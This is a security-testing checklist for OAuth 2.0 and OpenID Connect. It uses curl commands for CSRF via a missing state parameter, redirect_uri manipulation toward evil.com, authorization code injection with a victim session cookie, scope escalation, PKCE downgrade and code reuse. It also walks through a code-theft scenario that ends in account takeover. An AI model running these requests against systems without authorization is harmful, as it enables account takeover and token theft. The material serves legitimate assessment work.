# OAuth 2.0 / OIDC Security Testing

## Objective

Identify misconfigurations in OAuth 2.0 and OpenID Connect implementations that enable account takeover, authorization code interception, CSRF attacks, token theft, or privilege escalation.

---

## 1. OAuth Flow Recon

### Identify OAuth Parameters
```bash
# Capture authorization request
curl -si "https://target/oauth/authorize" | grep -iE "client_id|redirect_uri|response_type|scope|state"

# Check discovery document (OIDC)
curl -s "https://target/.well-known/openid-configuration" | python3 -m json.tool
curl -s "https://target/.well-known/oauth-authorization-server" | python3 -m json.tool

# Fetch JWKS (signing keys)
curl -s "https://target/.well-known/jwks.json" | python3 -m json.tool
```

### Document the Flow
- Flow type: Authorization Code / Implicit / Client Credentials / PKCE
- `redirect_uri` values accepted
- `scope` values offered
- `state` parameter usage (CSRF protection)
- Token endpoint and grant types

---

## 2. CSRF via Missing `state` Parameter

```bash
# Step 1: Start OAuth flow and capture the authorization URL
# Normal: /oauth/authorize?client_id=X&redirect_uri=Y&state=RANDOM_VALUE

# Step 2: Remove or replay state parameter
# No state:
curl -siL "https://target/oauth/authorize?client_id=APP_ID&redirect_uri=https://target/callback&response_type=code" \
  | grep -iE "location:|state|error"

# Fixed/replayed state:
curl -siL "https://target/oauth/authorize?client_id=APP_ID&redirect_uri=https://target/callback&response_type=code&state=abc123" \
  -H "Cookie: session=VICTIM_SESSION" | grep -iE "location:|state"

# Step 3: If state is not validated → CSRF on OAuth account linking
```

---

## 3. `redirect_uri` Manipulation

### 3.1 Open Redirect to Token Theft
```bash
CLIENT_ID="APP_CLIENT_ID"
AUTH_EP="https://target/oauth/authorize"

# Test: arbitrary redirect_uri
curl -siL "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://evil.com&response_type=code&state=test" \
  | grep -iE "location:|error|redirect"

# Test: path traversal on whitelisted URI
# Whitelist: https://app.target.com/callback
curl -siL "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback/../../../evil&response_type=code" \
  | grep -iE "location:|error"

# Test: subdomain variation
curl -siL "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://evil.app.target.com/callback&response_type=code" \
  | grep -i location

# Test: URL fragment
curl -siL "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://app.target.com/callback%23.evil.com&response_type=code" \
  | grep -i location
```

### 3.2 redirect_uri to Attacker-Controlled Page
If `redirect_uri` can be set to an attacker domain → auth code/token appears in `Location:` header → stolen by attacker.

```
Attack scenario:
1. Attacker crafts: /oauth/authorize?client_id=X&redirect_uri=https://evil.com/steal
2. Victim visits attacker link (while logged in to target)
3. Target redirects: https://evil.com/steal?code=AUTH_CODE
4. Attacker exchanges code for access_token
5. Account takeover via OAuth
```

---

## 4. Authorization Code Injection (ACI)

If the application accepts an authorization code through a URL parameter and exchanges it without binding to the initiating session:

```bash
# Step 1: Attacker generates their own auth code (from their own OAuth flow)
ATTACKER_CODE="code_from_attackers_own_oauth_flow"

# Step 2: Inject attacker's code into victim's callback
curl -si "https://target/oauth/callback?code=$ATTACKER_CODE&state=VICTIM_STATE" \
  -H "Cookie: session=VICTIM_SESSION" | grep HTTP

# If accepted → attacker's identity linked to victim's account
```

---

## 5. Token Leakage via Referer

```bash
# Check if access token appears in URL (Authorization Code flow should use code, not token in URL)
# Implicit flow sends token in fragment: #access_token=TOKEN
# Check if fragment is sent in Referer to external resources

# Inspect redirect after callback
curl -siL "https://target/oauth/callback?code=AUTH_CODE" | grep -iE "location:|access_token"
```

---

## 6. Scope Escalation

```bash
AUTH_EP="https://target/oauth/authorize"
CLIENT_ID="APP_CLIENT_ID"

# Request higher scopes than normally granted
curl -siL "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://target/callback&scope=admin:all&response_type=code" \
  | grep -iE "location:|scope|error"

# Try adding additional scopes
curl -siL "$AUTH_EP?client_id=$CLIENT_ID&redirect_uri=https://target/callback&scope=read:profile+write:admin&response_type=code" \
  | grep -i scope
```

---

## 7. PKCE Downgrade Attack

If PKCE is implemented but can be bypassed:

```bash
# Normal PKCE flow requires code_verifier
# Test: exchange code without code_verifier
curl -si -X POST https://target/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://target/callback&client_id=$CLIENT_ID" \
  | grep -iE "access_token|error"

# Test: wrong code_verifier
curl -si -X POST https://target/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&code_verifier=WRONG_VERIFIER&client_id=$CLIENT_ID" \
  | grep -iE "access_token|error"
```

---

## 8. Authorization Code Reuse

```bash
# Use same authorization code twice
CODE="VALID_AUTH_CODE"

# First exchange (should succeed)
curl -si -X POST https://target/oauth/token \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://target/callback&client_id=$CLIENT_ID" \
  | grep -iE "access_token|error"

# Second exchange (should fail — code already used)
curl -si -X POST https://target/oauth/token \
  -d "grant_type=authorization_code&code=$CODE&redirect_uri=https://target/callback&client_id=$CLIENT_ID" \
  | grep -iE "access_token|error"

# Vulnerable if second request also returns access_token
```

---

## 9. Token Lifetime & Revocation

```bash
# Access token expiry testing
ACCESS_TOKEN="CAPTURED_ACCESS_TOKEN"

# Use token normally
curl -si https://target/api/me \
  -H "Authorization: Bearer $ACCESS_TOKEN" | grep HTTP

# Logout / revoke token
curl -si -X POST https://target/oauth/revoke \
  -d "token=$ACCESS_TOKEN" | grep HTTP

# Re-use after revocation — should fail
curl -si https://target/api/me \
  -H "Authorization: Bearer $ACCESS_TOKEN" | grep HTTP
```

---

## Evidence to Capture

- Full OAuth authorization URL with all parameters
- redirect_uri manipulation response (Location header)
- CSRF PoC (missing state parameter flow)
- Code reuse response (second exchange success)
- Scope escalation response

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Missing state parameter (CSRF) | Pass/Fail | High |
| redirect_uri → external domain | Pass/Fail | Critical |
| redirect_uri path traversal bypass | Pass/Fail | High |
| Authorization code reuse | Pass/Fail | High |
| Scope escalation | Pass/Fail | High |
| PKCE downgrade | Pass/Fail | High |
| Token reuse after revocation | Pass/Fail | Medium |
